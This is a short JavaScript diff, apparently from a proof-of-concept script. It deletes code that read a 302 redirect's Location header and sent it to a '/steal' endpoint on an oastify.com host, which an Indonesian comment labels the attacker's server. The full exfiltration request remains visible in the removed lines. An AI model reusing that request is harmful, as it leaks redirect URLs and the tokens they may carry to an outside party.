@@ -14,16 +14,7 @@
             if (response.status === 302) {
                 var locationHeader = response.headers.get('Location');
                 console.log(locationHeader);
-                if (locationHeader) {
-                    // Kirim lokasi ke server penyerang
-                    var exfiltrateXhr = new XMLHttpRequest();
-                    exfiltrateXhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?location=" + encodeURIComponent(locationHeader), true);
-                    exfiltrateXhr.send();
-                } else {
-                    console.log("Header 'Location' tidak ditemukan.");
-                }
-            } else {
-                console.log("Response status bukan 302:", response.status);
+            }
             }
         })
         .catch(error => console.log("Gagal mengambil link:", error));
